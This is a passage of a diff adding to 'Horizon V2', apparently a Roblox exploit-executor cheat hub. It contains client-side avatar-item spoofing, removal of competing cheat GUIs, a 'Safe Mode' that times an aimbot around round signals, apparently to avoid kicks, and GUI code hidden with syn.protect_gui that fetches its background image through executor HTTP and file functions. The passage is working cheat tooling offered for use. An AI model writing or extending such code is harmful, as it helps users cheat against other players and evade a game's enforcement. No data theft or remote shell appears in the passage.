+            if state.r6Meshes then for _, v in ipairs(state.r6Meshes) do v:Clone().Parent = leg end end
+            state.r6LegColor = nil; state.r6Meshes = nil
+        end
+    else
+        local upper = char:FindFirstChild("RightUpperLeg")
+        local lower = char:FindFirstChild("RightLowerLeg")
+        local foot  = char:FindFirstChild("RightFoot")
+        if not upper then return end
+        if enabled then
+            if not state.r15Transparency then
+                state.r15Transparency = {upper.Transparency, lower and lower.Transparency or 0, foot and foot.Transparency or 0}
+            end
+            upper.Transparency = 1; if lower then lower.Transparency = 1 end; if foot then foot.Transparency = 1 end
+            local old = char:FindFirstChild("HorizonKorbloxLeg"); if old then old:Destroy() end
+            local leg = Instance.new("Part", char)
+            leg.Name = "HorizonKorbloxLeg"; leg.Size = Vector3.new(1, 2, 1)
+            leg.Anchored = false; leg.CanCollide = false; leg.Massless = true; leg.Color = Color3.fromRGB(64, 64, 64)
+            local mesh = Instance.new("SpecialMesh", leg)
+            mesh.MeshType = Enum.MeshType.FileMesh; mesh.MeshId = KORBLOX_MESH_ID; mesh.TextureId = KORBLOX_TEXTURE_ID
+            local weld = Instance.new("Weld", leg)
+            weld.Name = "HorizonKorbloxWeld"; weld.Part0 = upper; weld.Part1 = leg; weld.C0 = CFrame.new(0, -.8, 0)
+        else
+            local vals = state.r15Transparency
+            if vals then
+                upper.Transparency = vals[1]
+                if lower then lower.Transparency = vals[2] end
+                if foot then foot.Transparency = vals[3] end
+            end
+            local leg = char:FindFirstChild("HorizonKorbloxLeg"); if leg then leg:Destroy() end
+            state.r15Transparency = nil
+        end
+    end
+end
+
+-- re-apply cosmetics on respawn
+LP.CharacterAdded:Connect(function(char)
+    task.wait(0.8)
+    pcall(function()
+        if __HH.headlessEnabled then applyHeadless(char, true) end
+        if __HH.korbloxEnabled then applyKorblox(char, true) end
+    end)
+end)
+
+-- ============================================
+-- CATALOG CHANGER (VisDuels port): Pack Accessory — Bleed 1 / Bleed 2 / Bleed 3
+-- Changes shirt / pants / head / accessory / korblox (client-side).
+-- ============================================
+currentAccessoryPack = "Off"
+__HH.OriginalOutfit = {shirt = nil, pants = nil}
+__HH.OriginalAccessories = {}
+
+local ACCESSORY_PACK_ORDER = {
+    {"Off", "Off"},
+    {"Bleed 1", "Bleed 1"},
+    {"Bleed 2", "Bleed 2"},
+    {"Bleed 3", "Bleed 3"},
+}
+
+local BLEED_PACKS = {
+    ["Bleed 1"] = {
+        accessory = 306969564,
+        offset = Vector3.new(0.0000, 0.3000, 0.0000),
+        headMesh = "http://www.roblox.com/asset/?id=134079402",
+        headTexture = "http://www.roblox.com/asset/?id=133940918",
+        shirt = "http://www.roblox.com/asset/?id=10632503795",
+        pants = "http://www.roblox.com/asset/?id=123161592384863",
+        korblox = "right",
+    },
+    ["Bleed 2"] = {
+        accessory = 1744060292,
+        offset = Vector3.new(0.0000, 1.4000, -0.2000),
+        headMesh = "http://www.roblox.com/asset/?id=134079402",
+        headTexture = "http://www.roblox.com/asset/?id=133940918",
+        shirt = "http://www.roblox.com/asset/?id=11526718530",
+        pants = "http://www.roblox.com/asset/?id=93710523210027",
+        korblox = "right",
+    },
+    ["Bleed 3"] = {
+        accessory = 112564966849233,
+        offset = Vector3.new(0.0000, 0.6000, 0.0000),
+        headMesh = "http://www.roblox.com/asset/?id=134079402",
+        headTexture = "http://www.roblox.com/asset/?id=133940918",
+        shirt = "http://www.roblox.com/asset/?id=11849088376",
+        pants = "http://www.roblox.com/asset/?id=16534673928",
+        korblox = "right",
+    },
+}
+
+local function saveOriginalOutfit(char)
+    if not char then return end
+    local shirt = char:FindFirstChildWhichIsA("Shirt")
+    local pants = char:FindFirstChildWhichIsA("Pants")
+    __HH.OriginalOutfit.shirt = shirt and shirt.ShirtTemplate or nil
+    __HH.OriginalOutfit.pants = pants and pants.PantsTemplate or nil
+end
+
+local function restoreOriginalOutfit(char)
+    if not char then return end
+    for _, obj in ipairs(char:GetChildren()) do
+        if obj:IsA("Shirt") or obj:IsA("Pants") then
+            obj:Destroy()
+        end
+    end
+    if __HH.OriginalOutfit.shirt then
+        local newShirt = Instance.new("Shirt")
+        newShirt.ShirtTemplate = __HH.OriginalOutfit.shirt
+        newShirt.Parent = char
+    end
+    if __HH.OriginalOutfit.pants then
+        local newPants = Instance.new("Pants")
+        newPants.PantsTemplate = __HH.OriginalOutfit.pants
+        newPants.Parent = char
+    end
+    __HH.OriginalOutfit.shirt = nil
+    __HH.OriginalOutfit.pants = nil
+end
+
+local function clearAllOutfit(char)
+    if not char then return end
+    for _, obj in ipairs(char:GetChildren()) do
+        if obj:IsA("Shirt") or obj:IsA("Pants") then
+            obj:Destroy()
+        end
+    end
+end
+
+local function saveOriginalAccessories(char)
+    __HH.OriginalAccessories = {}
+    if not char then return end
+    for _, child in ipairs(char:GetChildren()) do
+        if child:IsA("Accessory") or child:IsA("Hat") then
+            local clone = child:Clone()
+            table.insert(__HH.OriginalAccessories, clone)
+        end
+    end
+end
+
+local function restoreOriginalAccessories(char)
+    if not char then return end
+    for _, child in ipairs(char:GetChildren()) do
+        if child:IsA("Accessory") or child:IsA("Hat") or child.Name == "AuFfitAccessory" then
+            child:Destroy()
+        end
+    end
+    for _, clone in ipairs(__HH.OriginalAccessories) do
+        if clone and clone.Parent == nil then
+            local newAcc = clone:Clone()
+            newAcc.Parent = char
+            for _, weld in ipairs(newAcc:GetDescendants()) do
+                if weld:IsA("Weld") or weld:IsA("WeldConstraint") then
+                    if weld:IsA("Weld") then
+                        local part0Name = weld.Part0 and weld.Part0.Name
+                        local part1Name = weld.Part1 and weld.Part1.Name
+                        if part0Name then
+                            local newPart0 = char:FindFirstChild(part0Name)
+                            if newPart0 then weld.Part0 = newPart0 end
+                        end
+                        if part1Name then
+                            local newPart1 = char:FindFirstChild(part1Name)
+                            if newPart1 then weld.Part1 = newPart1 end
+                        end
+                    elseif weld:IsA("WeldConstraint") then
+                        local part0Name = weld.Part0 and weld.Part0.Name
+                        local part1Name = weld.Part1 and weld.Part1.Name
+                        if part0Name then
+                            local newPart0 = char:FindFirstChild(part0Name)
+                            if newPart0 then weld.Part0 = newPart0 end
+                        end
+                        if part1Name then
+                            local newPart1 = char:FindFirstChild(part1Name)
+                            if newPart1 then weld.Part1 = newPart1 end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    __HH.OriginalAccessories = {}
+end
+
+local function clearAllAccessories(char)
+    if not char then return end
+    for _, child in ipairs(char:GetChildren()) do
+        if child:IsA("Accessory") or child:IsA("Hat") or child.Name == "AuFfitAccessory" then
+            child:Destroy()
+        end
+        if child.Name:find("Korblox_") or child.Name:find("Headless_") then
+            child:Destroy()
+        end
+    end
+    local partsToHide = {"Head", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot"}
+    for _, partName in ipairs(partsToHide) do
+        local part = char:FindFirstChild(partName)
+        if part and part:IsA("BasePart") then
+            part.Transparency = 0
+        end
+    end
+    local head = char:FindFirstChild("Head")
+    if head and head:IsA("MeshPart") then
+        head.Transparency = 0
+    end
+end
+
+local function applyBleedOutfit(packName)
+    local config = BLEED_PACKS[packName]
+    if not config then return false end
+
+    local char = LP.Character
+    if not char then return false end
+
+    char:WaitForChild("Head", 10)
+    local head = char:FindFirstChild("Head")
+    if not head then return false end
+
+    if config.headMesh then
+        for _, d in ipairs(char:GetChildren()) do
+            if d:IsA("CharacterMesh") and d.BodyPart == Enum.BodyPart.Head then
+                pcall(function() d:Destroy() end)
+            end
+        end
+        local done = false
+        if head:IsA("MeshPart") then
+            done = pcall(function()
+                head.MeshId = config.headMesh
+                if config.headTexture then head.TextureID = config.headTexture end
+            end)
+        end
+        if not done then
+            local sm = head:FindFirstChildWhichIsA("SpecialMesh") or Instance.new("SpecialMesh")
+            sm.Parent = head
+            sm.MeshType = Enum.MeshType.FileMesh
+            sm.MeshId = config.headMesh
+            sm.TextureId = config.headTexture or ""
+        end
+    end
+
+    if config.shirt then
+        local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
+        s.Name = "Shirt"; s.ShirtTemplate = config.shirt; s.Parent = char
+    end
+    if config.pants then
+        local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
+        p.Name = "Pants"; p.PantsTemplate = config.pants; p.Parent = char
+    end
+
+    if config.accessory and head then
+        local old = char:FindFirstChild("AuFfitAccessory")
+        if old then old:Destroy() end
+        local objs = nil
+        local ok, res = pcall(function()
+            return game:GetObjects("rbxassetid://" .. tostring(config.accessory))
+        end)
+        if ok and typeof(res) == "table" and #res > 0 then
+            objs = res
+        else
+            ok, res = pcall(function()
+                return game:GetService("InsertService"):LoadAsset(config.accessory)
+            end)
+            if ok and res then objs = {res} end
+        end
+        if objs then
+            local handle
+            for _, o in ipairs(objs) do
+                if o:IsA("BasePart") then handle = o; break end
+                local f = o:FindFirstChildWhichIsA("BasePart", true)
+                if f then handle = f; break end
+            end
+            if handle then
+                local h = handle:Clone()
+                h.Name = "AuFfitAccessory"
+                h.CanCollide = false
+                h.Anchored = false
+                h.Massless = true
+                h.Parent = char
+                local weld = Instance.new("Weld")
+                weld.Part0 = head
+                weld.Part1 = h
+                weld.C0 = CFrame.new(config.offset or Vector3.zero)
+                weld.Parent = h
+            end
+            for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
+        end
+    end
+
+    if config.korblox and config.korblox ~= "none" then
+        local function attachKorblox(side)
+            local ids = { left = 139607673, right = 139607718 }
+            local targets = { left = "LeftUpperLeg", right = "RightUpperLeg" }
+            local hides = {
+                left = {"LeftUpperLeg", "LeftLowerLeg", "LeftFoot"},
+                right = {"RightUpperLeg", "RightLowerLeg", "RightFoot"}
+            }
+            local targetPart = char:FindFirstChild(targets[side])
+            if not targetPart then return false end
+            for _, partName in ipairs(hides[side]) do
+                local limb = char:FindFirstChild(partName)
+                if limb and limb:IsA("BasePart") then limb.Transparency = 1 end
+            end
+            local success, objects = pcall(function()
+                return game:GetObjects("rbxassetid://" .. ids[side])
+            end)
+            if not success or not objects or #objects == 0 then return false end
+            local assetModel = objects[1]
+            local mainMesh = assetModel:IsA("BasePart") and assetModel or assetModel:FindFirstChildWhichIsA("BasePart", true)
+            if not mainMesh then assetModel:Destroy(); return false end
+            mainMesh.CanCollide = false
+            mainMesh.Massless = true
+            mainMesh.CFrame = targetPart.CFrame
+            local weld = Instance.new("WeldConstraint")
+            weld.Part0 = targetPart
+            weld.Part1 = mainMesh
+            weld.Parent = mainMesh
+            assetModel.Parent = char
+            return true
+        end
+        if config.korblox == "left" then
+            attachKorblox("left")
+        elseif config.korblox == "right" then
+            attachKorblox("right")
+        end
+    end
+
+    return true
+end
+
+function applyAccessoryPack(packName)
+    local char = LP.Character
+    if not char then return end
+
+    if packName == "Off" then
+        clearAllAccessories(char)
+        restoreOriginalOutfit(char)
+        restoreOriginalAccessories(char)
+        return
+    end
+
+    if not __HH.OriginalOutfit.shirt and not __HH.OriginalOutfit.pants then
+        saveOriginalOutfit(char)
+    end
+    if #__HH.OriginalAccessories == 0 then
+        saveOriginalAccessories(char)
+    end
+
+    clearAllOutfit(char)
+    clearAllAccessories(char)
+    applyBleedOutfit(packName)
+end
+
+-- re-apply pack on respawn (same as VisDuels reapplyAllStates)
+LP.CharacterAdded:Connect(function(char)
+    if currentAccessoryPack and currentAccessoryPack ~= "Off" then
+        task.wait(0.3)
+        if LP.Character == char and currentAccessoryPack ~= "Off" then
+            pcall(function() applyAccessoryPack(currentAccessoryPack) end)
+        end
+    end
+end)
+
+pcall(function()
+    local cg = game:GetService("CoreGui")
+    for _, name in ipairs({"Horizon V2", "Horizon Hub", "Pure hub", "HorizonHubMobileButtons", "PureHubMobileButtons", "VynxMobileButtons", "YousefIntro", "StealBarGui"}) do
+        local old = cg:FindFirstChild(name)
+        if old then old:Destroy() end
+    end
+    local pg = LP:FindFirstChild("PlayerGui")
+    if pg then
+        for _, name in ipairs({"Horizon V2", "Horizon Hub", "Pure hub", "StealBarGui", "YousefIntro", "VynxMobileButtons"}) do
+            local old = pg:FindFirstChild(name)
+            if old then old:Destroy() end
+        end
+    end
+end)
+_G.VYNX_LOADED = true
+
+-- =============== SAFE MODE: CERTZ 5s / GUI PHRASE 2s + 5s ===============
+do
+    -- Keep all Safe Mode state inside one table so this large script does not
+    -- gain many long-lived top-level locals (Luau has a local/register limit).
+    local SM = {
+        duration          = 5,
+        guiLeadDelay      = 2,
+        activeDuration    = 5,
+        signalCooldown    = 1,
+        liveCooldown      = 10,
+        roundSignalTime   = 0,
+        restoreThread     = nil,
+        lastSignalAt      = 0,
+        lastGuiSignalAt   = 0,
+        p3                = Vector3.new(-476.752, 10.464,   7.107),
+        p7                = Vector3.new(-476.752, 10.464, 114.107),
+        lastName          = "",
+        lastValue         = 0,
+        lastLiveAt        = 0,
+        wasEnabled        = false,
+        generation        = (_G.AceSafeModeGeneration or 0) + 1,
+    }
+    _G.AceSafeModeGeneration = SM.generation
+
+    function _G.AceSafeModeGetCountdownLabel() return nil end
+    function _G.AceSafeModeCountdownNumber(text) return false end
+    function _G.AceSafeModeInDuelCountdown() return false end
+
+    function _G.AceSafeModeIsLocked()
+        if antiKickEnabled ~= true or SM.roundSignalTime <= 0 then return false end
+        return tick() - SM.roundSignalTime < SM.activeDuration
+    end
+
+    function _G.AceSafeModeForceStop(reason)
+        -- Drop-then-Aim may bypass ordinary manual stops, but it must never
+        -- bypass an active Safe Mode window. Otherwise its restore coroutine
+        -- can turn AIM BOT back on 1-2 seconds early in later rounds.
+        local safeLocked = _G.AceSafeModeIsLocked
+            and _G.AceSafeModeIsLocked() == true
+        if not safeLocked and (_G.PureDropThenAimCycleActive == true
+        or _G.PureDropThenAimSafeModeAuthorized == true) then
+            return false
+        end
+
+        local backendOn = false
+        if _G.PureCursedGetAimbot then
+            local ok, enabled = pcall(_G.PureCursedGetAimbot)
+            backendOn = ok and enabled == true
+        end
+        if not __HH.batV2Enabled and not backendOn then return false end
+
+        antiKickAimPending = false
+        __HH.batV2Enabled = false
+        if stopAimbotFull then
+            pcall(stopAimbotFull)
+        elseif _G.PureCursedSetAimbot then
+            pcall(_G.PureCursedSetAimbot, false)
+        end
+        if __HH.batV2SetVisual then __HH.batV2SetVisual(false) end
+        if __HH.mobBtnRefs and __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(false) end
+        return true
+    end
+
+    function _G.AceSafeModeRestorePendingAim()
+        antiKickAimPending = false
+        return false
+    end
+
+    function _G.AceSafeModeTryStart(allowDropThenAim)
+        if not (_G.AceSafeModeIsLocked and _G.AceSafeModeIsLocked()) then
+            return true
+        end
+        antiKickAimPending = false
+        _G.AceSafeModeForceStop("AIM BOT BEFORE START")
+        return false
+    end
+
+    local function _smOnRoundSignal(source)
+        if antiKickEnabled ~= true then return false end
+
+        local now = tick()
+        local isGuiPhrase = source == "WON THIS ROUND GUI SAFE MODE"
+
+        -- Certz can detect the result shortly before the visible GUI sentence.
+        -- The GUI sentence is authoritative: it is allowed to realign the timer
+        -- once, while repeated Text events are ignored. After the sentence, a
+        -- late Certz snapshot cannot shorten or restart that same round.
+        if isGuiPhrase then
+            if SM.lastGuiSignalAt > 0
+            and now - SM.lastGuiSignalAt < 1 then return false end
+            SM.lastGuiSignalAt = now
+        else
+            if SM.lastGuiSignalAt > 0
+            and now - SM.lastGuiSignalAt < (SM.duration + SM.guiLeadDelay) then return false end
+            if SM.lastSignalAt > 0
+            and now - SM.lastSignalAt < SM.signalCooldown then return false end
+        end
+
+        -- Certz starts a direct five-second pause. The GUI sentence starts with
+        -- a two-second lead, followed by the same five-second pause (seven total).
+        SM.activeDuration = SM.duration + (isGuiPhrase and SM.guiLeadDelay or 0)
+        SM.lastSignalAt = now
+        SM.roundSignalTime = now
+
+        -- A completed carry handoff leaves this flag true. Clear that stale
+        -- authorization at every new round so it cannot defeat Safe Mode.
+        _G.PureDropThenAimSafeModeAuthorized = false
+        _G.AceSafeModeForceStop(source or "ROUND SAFE MODE")
+        print(string.format(
+            "[SAFE MODE] signal=%s | lead=%.2fs | countdown=%.2fs | total=%.2fs",
+            tostring(source or "unknown"),
+            isGuiPhrase and SM.guiLeadDelay or 0,
+            SM.duration,
+            SM.activeDuration
+        ))
+
+        if SM.restoreThread then
+            pcall(task.cancel, SM.restoreThread)
+            SM.restoreThread = nil
+        end
+
+        SM.restoreThread = task.delay(SM.activeDuration, function()
+            if _G.AceSafeModeGeneration ~= SM.generation then
+                SM.restoreThread = nil
+                return
+            end
+            SM.restoreThread = nil
+            antiKickAimPending = false
+            -- Manual behavior requested: when the Safe Mode timer ends, AIM BOT
+            -- stays OFF and can only be enabled again by the user.
+            print("[SAFE MODE] timer ended; AIM BOT remains OFF until manually enabled")
+        end)
+        return true
+    end
+
+    local function _smNum(value)
+        value = tostring(value):gsub("%s", "")
+        local number, suffix = value:match("([%d%.]+)(%a?)")
+        number = tonumber(number) or 0
+        if suffix == "K" or suffix == "k" then number = number * 1e3
+        elseif suffix == "M" or suffix == "m" then number = number * 1e6
+        elseif suffix == "B" or suffix == "b" then number = number * 1e9
+        elseif suffix == "T" or suffix == "t" then number = number * 1e12 end
+        return number
+    end
+
+    local function _smMyPlot()
+        for _, object in ipairs(workspace:GetDescendants()) do
+            if object:IsA("BasePart") and object.Name == "PlotSign" then
+                local d3 = (object.Position - SM.p3).Magnitude
+                local d7 = (object.Position - SM.p7).Magnitude
+                if d3 < 5 or d7 < 5 then
+                    for _, label in ipairs(object:GetDescendants()) do
+                        if label:IsA("TextLabel") and label.Text ~= "" then
+                            if label.Text:find(LP.Name, 1, true)
+                            or label.Text:find(LP.DisplayName, 1, true) then
+                                return d3 < 5 and 3 or 7
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        return nil
+    end
+
+    -- Certz live-win logic, merged only as a Safe Mode round signal. It does
+    -- not send a webhook and deliberately does not check which player won.
+    -- The first valid snapshot is accepted immediately, which covers the first
+    -- round instead of waiting for a previous "won this round!" GUI sentence.
+    task.spawn(function()
+        while _G.AceSafeModeGeneration == SM.generation do
+            repeat
+            task.wait(1)
+
+            if antiKickEnabled ~= true then
+                SM.wasEnabled = false
+                SM.roundSignalTime = 0
+                SM.activeDuration = SM.duration
+                SM.lastSignalAt = 0
+                SM.lastGuiSignalAt = 0
+                if SM.restoreThread then
+                    pcall(task.cancel, SM.restoreThread)
+                    SM.restoreThread = nil
+                end
+                break -- continue
+            end
+
+            if not SM.wasEnabled then
+                SM.wasEnabled = true
+                SM.lastName = ""
+                SM.lastValue = 0
+                SM.lastLiveAt = 0
+            end
+
+            local mine = _smMyPlot()
+            if not mine then break --[[continue]] end
+
+            local opponentPosition = mine == 3 and SM.p7 or SM.p3
+            local debris = workspace:FindFirstChild("Debris")
+            if not debris then break --[[continue]] end
+
+            local bestName, bestValue
+            for _, object in ipairs(debris:GetChildren()) do
+                repeat
+                if object.Name ~= "FastOverheadTemplate" then break --[[continue]] end
+
+                local surface = object:FindFirstChildOfClass("SurfaceGui")
+                if not surface or not surface.Adornee then break --[[continue]] end
+                if (surface.Adornee.Position - opponentPosition).Magnitude > 50 then break --[[continue]] end
+
+                local generation = surface:FindFirstChild("Generation", true)
+                if generation and generation:IsA("TextLabel") then
+                    local value = _smNum(generation.Text)
+                    if not bestValue or value > bestValue then
+                        bestValue = value
+                        local displayName = surface:FindFirstChild("DisplayName", true)
+                        bestName = displayName and displayName.Text or object.Name
+                    end
+                end
+                until true
+            end
+
+            if bestName and bestValue then
+                local changed = bestName ~= SM.lastName or bestValue ~= SM.lastValue
+                if changed then
+                    local firstSnapshot = SM.lastName == "" and SM.lastValue == 0
+                    SM.lastName = bestName
+                    SM.lastValue = bestValue
+
+                    local now = tick()
+                    if firstSnapshot or now - SM.lastLiveAt > SM.liveCooldown then
+                        SM.lastLiveAt = now
+                        _smOnRoundSignal(firstSnapshot
+                            and "FIRST ROUND LIVE-WIN SAFE MODE"
+                            or "LIVE-WIN CHANGE SAFE MODE")
+                    end
+                end
+            end
+            until true
+        end
+    end)
+
+    local function _smStrip(text)
+        return text and text:gsub("<[^>]+>", "") or ""
+    end
+
+    local function _smScan(object)
+        if _G.AceSafeModeGeneration ~= SM.generation then return end
+        if not (object:IsA("TextLabel")
+        or object:IsA("TextButton")
+        or object:IsA("TextBox")) then return end
+
+        local clean = _smStrip(object.Text):lower()
+        -- Ignore punctuation so both "won this round" and
+        -- "won this round!" are accepted after RichText tags are removed.
+        if clean:find("won this round", 1, true) then
+            _smOnRoundSignal("WON THIS ROUND GUI SAFE MODE")
+        end
+    end
+
+    local playerGui = LP:WaitForChild("PlayerGui")
+    for _, object in ipairs(playerGui:GetDescendants()) do
+        pcall(_smScan, object)
+        if object:IsA("TextLabel")
+        or object:IsA("TextButton")
+        or object:IsA("TextBox") then
+            object:GetPropertyChangedSignal("Text"):Connect(function()
+                pcall(_smScan, object)
+            end)
+        end
+    end
+    playerGui.DescendantAdded:Connect(function(object)
+        pcall(_smScan, object)
+        if object:IsA("TextLabel")
+        or object:IsA("TextButton")
+        or object:IsA("TextBox") then
+            object:GetPropertyChangedSignal("Text"):Connect(function()
+                pcall(_smScan, object)
+            end)
+        end
+    end)
+
+    if _G.AceSafeModeMonitorConn then
+        pcall(function() _G.AceSafeModeMonitorConn:Disconnect() end)
+    end
+    _G.AceSafeModeMonitorStarted = nil
+    _G.AceSafeModeMonitorConn = RunService.Heartbeat:Connect(function()
+        if _G.AceSafeModeGeneration ~= SM.generation then return end
+        if not _G.AceSafeModeIsLocked() then
+            antiKickAimPending = false
+            if _G.PureDropThenAimCycleActive ~= true then
+                _G.PureDropThenAimSafeModeAuthorized = false
+            end
+            return
+        end
+        -- Keep enforcing the lock even if Drop-then-Aim finishes during it.
+        -- That coroutine may restore AIM BOT once; this heartbeat turns it back
+        -- off immediately and the normal Safe Mode timer remains authoritative.
+        _G.AceSafeModeForceStop("SAFE MODE HEARTBEAT")
+    end)
+end
+-- =====================================================
+
+
+local function buildGui()
+    local WHITE    = Color3.fromRGB(205, 232, 255)
+    local BLACK    = Color3.fromRGB(8, 38, 85)
+    local DARK     = Color3.fromRGB(10,  10,  14)
+    local DARKER   = Color3.fromRGB(15,  10,  18)
+    local MID      = Color3.fromRGB(40,  40,  40)
+    local DIM_LINE = Color3.fromRGB(0, 60, 160)
+    local CHECK_OFF= Color3.fromRGB(12, 55, 120)
+    local BTN_ACT  = Color3.fromRGB(90, 195, 255)
+    local INP_BG   = Color3.fromRGB(20,  20,  26)
+
+    for _, name in ipairs({"Horizon V2", "Horizon Hub", "Pure hub", "HorizonHubMobileButtons", "PureHubMobileButtons", "yousefStealBar", "yousefRagdollTimer"}) do
+        local old = game:GetService("CoreGui"):FindFirstChild(name)
+        if old then old:Destroy() end
+        local pg = LP:FindFirstChild("PlayerGui")
+        if pg then local o = pg:FindFirstChild(name); if o then o:Destroy() end end
+    end
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "Horizon V2"; gui.ResetOnSpawn = false
+    gui.DisplayOrder = 10; gui.IgnoreGuiInset = true
+    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
+    if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
+        gui.Parent = LP:WaitForChild("PlayerGui")
+    end
+
+    __HH.uiScaleObject = Instance.new("UIScale", gui)
+    __HH.uiScaleObject.Scale = uiScaleValue
+
+    __HH.mainFrame = Instance.new("Frame", gui)
+    __HH.mainFrame.Name = "MainFrame"
+    __HH.mainFrame.Size = UDim2.new(0, 580, 0, 650)
+    __HH.mainFrame.Position = UDim2.new(0.02, 0, 0.5, -325)
+    __HH.mainFrame.BackgroundColor3 = DARK
+    __HH.mainFrame.BorderSizePixel = 0
+    __HH.mainFrame.ClipsDescendants = true
+    Instance.new("UICorner", __HH.mainFrame).CornerRadius = UDim.new(0, 24)
+
+    __HH.bgImage = Instance.new("ImageLabel", __HH.mainFrame)
+    __HH.bgImage.Size = UDim2.new(1,0,1,0); __HH.bgImage.Position = UDim2.new(0,0,0,0)
+    __HH.bgImage.BackgroundTransparency = 1
+    __HH.bgImage.Image = ""
+    __HH.bgImage.ScaleType = Enum.ScaleType.Crop; __HH.bgImage.ZIndex = 1
+    __HH.bgImage.ImageTransparency = 0.45
+    Instance.new("UICorner", __HH.bgImage).CornerRadius = UDim.new(0,24)
+
+    -- Main GUI background image. Uses a unique cache name and supports common executor responses.
+    task.spawn(function()
+        pcall(function()
+            local _bgUrl  = "https://plain-eeur-prod-public.komododecks.com/202609/07/CW6xdbj5SeUYaTiyz3kt/image.jpg"
+            local _bgFile = "horizon_hub_background_CW6xdbj5SeUYaTiyz3kt.jpg"
+            local _req = (syn and syn.request) or (http and http.request) or request or http_request
+            local _get = getcustomasset or getsynasset
+            if not (_get and writefile and isfile) then return end
+
+            -- Always try to refresh, so an old image can never remain cached under this GUI.
+            -- game:HttpGet first (works on mobile executors that have no
+            -- syn.request), then the executor request bridge as fallback.
+            local body = nil
+            pcall(function()
+                local d = game:HttpGet(_bgUrl, true)
+                if type(d) == "string" and #d > 100 then body = d end
+            end)
+            if not body and _req then
+                local okReq, r = pcall(_req, {
+                    Url = _bgUrl,
+                    Method = "GET",
+                    Headers = { ["User-Agent"] = "Mozilla/5.0" },
+                })
+                if okReq and r then
+                    local b = r.Body or r.body
+                    local code = tonumber(r.StatusCode or r.Status or r.status_code)
+                    if b and #b > 100 and (r.Success == true or code == 200 or code == nil) then
+                        body = b
+                    end
+                end
+            end
+            if body and #body > 100 then
+                writefile(_bgFile, body)
+            end
+
+            if isfile(_bgFile) then
+                local okAsset, asset = pcall(_get, _bgFile)
+                if okAsset and asset and __HH.bgImage and __HH.bgImage.Parent then
+                    __HH.bgImage.Image = asset
+                    __HH.bgImage.ImageTransparency = 0.25
+                end
+            end
+        end)
+    end)
+
+    local bgOverlay = Instance.new("Frame", __HH.mainFrame)
+    bgOverlay.Size = UDim2.new(1,0,1,0); bgOverlay.BackgroundColor3 = DARK
+    bgOverlay.BackgroundTransparency = 1
+    bgOverlay.BorderSizePixel = 0; bgOverlay.ZIndex = 2
+    Instance.new("UICorner", bgOverlay).CornerRadius = UDim.new(0,24)
+
+    local dragging, dragInput2, dragStart2, startPos2
+    __HH.mainFrame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart2 = input.Position
+            startPos2 = __HH.mainFrame.Position
+            dragInput2 = input
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                    dragInput2 = nil
+                end
+            end)
+        end
+    end)
+    __HH.mainFrame.InputChanged:Connect(function(input)
+        if not dragging then return end
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            local delta = input.Position - dragStart2
+            if delta.Magnitude > 5 then
+                __HH.mainFrame.Position = UDim2.new(
+                    startPos2.X.Scale,
+                    startPos2.X.Offset + delta.X,
+                    startPos2.Y.Scale,
+                    startPos2.Y.Offset + delta.Y
+                )
+            end
+        end
+    end)
+
+    local Header = Instance.new("Frame", __HH.mainFrame)
+    Header.Name = "Header"; Header.Size = UDim2.new(1,0,0,65)
+    Header.BackgroundTransparency = 1; Header.ZIndex = 3
+
+    local Title = Instance.new("TextLabel", Header)
+    Title.Size = UDim2.new(0,180,1,0); Title.Position = UDim2.new(0,14,0,0)
+    Title.BackgroundTransparency = 1; Title.Text = "Horizon V2"
+    Title.TextColor3 = WHITE; Title.Font = Enum.Font.GothamBlack
+    Title.TextSize = 20; Title.TextXAlignment = Enum.TextXAlignment.Left; Title.ZIndex = 4
+
+    local HeaderLine = Instance.new("Frame", Header)
+    HeaderLine.Size = UDim2.new(1,-28,0,1); HeaderLine.Position = UDim2.new(0,14,1,0)
+    HeaderLine.BackgroundColor3 = Color3.fromRGB(105, 205, 255); HeaderLine.BackgroundTransparency = 0.5
+    HeaderLine.BorderSizePixel = 0; HeaderLine.ZIndex = 3
+
+    local closeBtn = Instance.new("TextButton", Header)
+    closeBtn.Size = UDim2.new(0,24,0,24); closeBtn.Position = UDim2.new(1,-34,0.5,-12)
+    closeBtn.BackgroundColor3 = MID; closeBtn.BorderSizePixel = 0
+    closeBtn.Text = "-"; closeBtn.TextColor3 = WHITE
+    closeBtn.Font = Enum.Font.GothamBold; closeBtn.TextSize = 18; closeBtn.ZIndex = 6
+    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0,5)
+    local closeBtnStroke = Instance.new("UIStroke", closeBtn)
+    closeBtnStroke.Color = WHITE; closeBtnStroke.Thickness = 1
+
+    local miniToggleBtn = Instance.new("TextButton", gui)
+    miniToggleBtn.Name = "MiniToggle"
+    miniToggleBtn.Size = UDim2.new(0, 240, 0, 52)
+    miniToggleBtn.Position = UDim2.new(0.02, 0, 0.45, 60)
+    miniToggleBtn.BackgroundColor3 = Color3.fromRGB(90, 195, 255)
+    miniToggleBtn.Text = "Horizon V2"
+    miniToggleBtn.TextColor3 = WHITE
+    miniToggleBtn.Font = Enum.Font.GothamBlack
+    miniToggleBtn.TextSize = 25
+    miniToggleBtn.BorderSizePixel = 0
+    miniToggleBtn.ZIndex = 100
+    miniToggleBtn.Visible = false
+    Instance.new("UICorner", miniToggleBtn).CornerRadius = UDim.new(0, 16)
+    local miniStroke = Instance.new("UIStroke", miniToggleBtn)
+    miniStroke.Color = Color3.fromRGB(0, 180, 255); miniStroke.Thickness = 2.5
+
+    local miniShadow = Instance.new("UIStroke", miniToggleBtn)
+    miniShadow.Color = Color3.fromRGB(0, 60, 150); miniShadow.Thickness = 4
+    miniShadow.Transparency = 0.7
+
+    miniToggleBtn.MouseButton1Click:Connect(function()
